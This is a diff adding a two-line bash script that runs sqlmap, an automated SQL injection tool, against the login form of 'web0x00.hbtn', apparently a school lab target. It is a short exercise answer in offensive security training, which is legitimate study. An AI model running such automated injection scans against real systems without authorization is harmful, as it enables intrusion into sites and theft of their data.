@@ -1,0 +1,2 @@
+#!/bin/bash
+sqlmap -u "http://web0x00.hbtn/login" --forms --batch --level=1 --risk=1
